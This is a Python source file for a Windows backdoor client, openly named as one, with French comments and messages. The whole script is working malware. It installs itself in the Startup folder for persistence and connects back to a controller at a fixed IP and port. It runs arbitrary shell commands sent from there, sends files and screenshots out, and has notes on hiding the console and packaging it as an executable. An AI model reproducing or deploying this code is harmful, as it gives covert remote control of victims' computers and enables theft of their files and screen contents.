# install Python
# https://www.digitalocean.com/community/tutorials/install-python-windows-10

# install pip 
# https://pip.pypa.io/en/stable/installation/

# install Pillow
# https://stackoverflow.com/questions/34594800/how-to-install-pillow-on-windows-using-pip

# rename file backdoor_client.pyw
# https://stackoverflow.com/questions/1689015/run-python-script-without-windows-console-appearing

# install PyInstaller
# pyinstaller --onefile backdoor_client.py

import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab
import getpass


HOST_IP = "192.168.1.23"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024
USER_NAME = getpass.getuser()


# https://stackoverflow.com/questions/4438020/how-to-start-a-python-file-while-windows-starts
def add_to_startup():
    file_path = os.path.dirname(os.path.realpath(__file__))
    print(f"add_to_startup file: {file_path}")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    print(f"add_to_startup bat: {bat_path}")
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)

add_to_startup()

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)

    commande_split = commande.split(" ")

    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'exite pas"
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "capture":
            capture_ecran = ImageGrab.grab()
            capture_filename = commande_split[1] + ".png"
            capture_ecran.save(capture_filename, "PNG")
            try:
                f = open(capture_filename, "rb")
            except FileNotFoundError:
                reponse = " ".encode()
            else:
                reponse = f.read()
                f.close()
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()

    # reponse est déjà encodé
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)
    
    # handshake

s.close()
